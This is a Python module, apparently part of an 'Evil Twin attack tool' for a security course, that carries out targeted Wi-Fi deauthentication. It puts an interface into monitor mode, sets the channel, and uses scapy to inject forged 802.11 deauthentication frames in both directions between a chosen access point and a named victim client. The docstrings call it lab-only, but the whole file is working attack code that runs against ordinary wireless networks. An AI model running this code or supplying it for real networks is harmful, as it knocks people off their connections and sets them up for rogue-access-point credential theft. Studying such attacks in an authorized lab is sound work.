import os
import re
import subprocess
import time
from dataclasses import dataclass
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

"""
Implements the Targeted Disconnection stage of the Evil Twin attack tool.

Main responsibilities:
    - Validate the selected AP BSSID and victim client MAC address.
    - Prepare the wireless interface for monitor-mode frame transmission.
    - Set the interface to the target network channel.
    - Build directed 802.11 deauthentication frames.
    - Send frames only between the selected AP and the selected victim client.
    - Return a structured result with success status, frames sent, and message.

"""

MAC_RE = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")


@dataclass
class DisconnectResult:
    success: bool
    interface: str
    target_bssid: str
    client_mac: str
    channel: int
    frames_sent: int
    message: str


def require_root():
    if os.geteuid() != 0:
        raise PermissionError("This action requires root. Run with sudo.")


def validate_mac(name: str, value: str) -> str:
    value = value.strip().lower()

    if not MAC_RE.match(value):
        raise ValueError(f"Invalid {name} MAC address: {value}")

    return value


def run_cmd(cmd):
    print(f"[CMD] {' '.join(cmd)}")

    result = subprocess.run(
        cmd,
        text=True,
        capture_output=True,
    )

    if result.stdout.strip():
        print(result.stdout.strip())

    if result.stderr.strip():
        print(result.stderr.strip())

    return result


def prepare_interface_for_monitor(interface: str) -> bool:
    """
    Prepare the Wi-Fi interface for monitor-mode frame sending.

    This is needed because previous stages may leave the interface in managed mode.
    """
    print(f"[*] Preparing {interface} for monitor mode...")

    commands = [
        ["rfkill", "unblock", "wifi"],
        ["ip", "link", "set", interface, "down"],
        ["iw", "dev", interface, "set", "type", "monitor"],
        ["ip", "link", "set", interface, "up"],
    ]

    for cmd in commands:
        result = run_cmd(cmd)

        if result.returncode != 0:
            print(f"[!] Failed command: {' '.join(cmd)}")
            print("[!] Could not enable monitor mode.")
            return False

    time.sleep(1)

    print(f"[+] {interface} is now in monitor mode.")
    return True


def set_channel(interface: str, channel: int) -> bool:
    print(f"[*] Setting {interface} to channel {channel}...")

    result = run_cmd(["iw", "dev", interface, "set", "channel", str(channel)])

    if result.returncode != 0:
        print("[!] Could not set channel.")
        print("[!] Make sure the interface supports monitor mode and this channel.")
        return False

    print(f"[+] Interface {interface} is now listening on channel {channel}.")
    return True


def build_deauth_frames(ap_bssid: str, client_mac: str):
    """
    Build two directed 802.11 deauthentication frames:

    1. AP -> selected client
    2. selected client -> AP

    Sending both directions improves reliability in lab environments.
    """
    ap_to_client = (
        RadioTap()
        / Dot11(
            type=0,
            subtype=12,
            addr1=client_mac,
            addr2=ap_bssid,
            addr3=ap_bssid,
        )
        / Dot11Deauth(reason=7)
    )

    client_to_ap = (
        RadioTap()
        / Dot11(
            type=0,
            subtype=12,
            addr1=ap_bssid,
            addr2=client_mac,
            addr3=ap_bssid,
        )
        / Dot11Deauth(reason=7)
    )

    return ap_to_client, client_to_ap


def targeted_disconnect(
    interface: str,
    target_bssid: str,
    client_mac: str,
    channel: int,
    rounds: int = 25,
    interval: float = 0.05,
    bidirectional: bool = True,
) -> DisconnectResult:
    """
    Disconnect only the selected victim client from the selected AP.

    Intended only for the authorized course/lab environment.
    The interface must support monitor mode and packet injection.
    """
    require_root()

    target_bssid = validate_mac("target BSSID", target_bssid)
    client_mac = validate_mac("client", client_mac)

    if channel <= 0:
        raise ValueError("Channel must be a positive integer.")

    if rounds <= 0:
        rounds = 25

    if interval <= 0:
        interval = 0.05

    print("=" * 80)
    print("TARGETED DISCONNECTION")
    print("=" * 80)
    print(f"Interface:      {interface}")
    print(f"Target AP:      {target_bssid}")
    print(f"Victim STA:     {client_mac}")
    print(f"Channel:        {channel}")
    print(f"Rounds:         {rounds}")
    print(f"Interval:       {interval}")
    print(f"Bidirectional:  {bidirectional}")
    print("=" * 80)

    monitor_ok = prepare_interface_for_monitor(interface)

    if not monitor_ok:
        return DisconnectResult(
            success=False,
            interface=interface,
            target_bssid=target_bssid,
            client_mac=client_mac,
            channel=channel,
            frames_sent=0,
            message="Could not enable monitor mode.",
        )

    channel_ok = set_channel(interface, channel)

    if not channel_ok:
        return DisconnectResult(
            success=False,
            interface=interface,
            target_bssid=target_bssid,
            client_mac=client_mac,
            channel=channel,
            frames_sent=0,
            message="Could not set the requested Wi-Fi channel.",
        )

    ap_to_client, client_to_ap = build_deauth_frames(
        ap_bssid=target_bssid,
        client_mac=client_mac,
    )

    frames_sent = 0

    print("[*] Sending targeted frames...")

    try:
        for i in range(rounds):
            sendp(ap_to_client, iface=interface, verbose=False)
            frames_sent += 1

            if bidirectional:
                sendp(client_to_ap, iface=interface, verbose=False)
                frames_sent += 1

            print(f"[*] Round {i + 1}/{rounds} complete. Total frames sent: {frames_sent}")
            time.sleep(interval)

    except Exception as exc:
        print(f"[ERROR] Sending failed: {exc}")

        return DisconnectResult(
            success=False,
            interface=interface,
            target_bssid=target_bssid,
            client_mac=client_mac,
            channel=channel,
            frames_sent=frames_sent,
            message=f"Sending failed: {exc}",
        )

    print("[+] Targeted disconnection attempt completed.")
    print("[+] Watch the client device for disconnect/reconnect behavior.")

    return DisconnectResult(
        success=True,
        interface=interface,
        target_bssid=target_bssid,
        client_mac=client_mac,
        channel=channel,
        frames_sent=frames_sent,
        message="Targeted frames sent.",
    )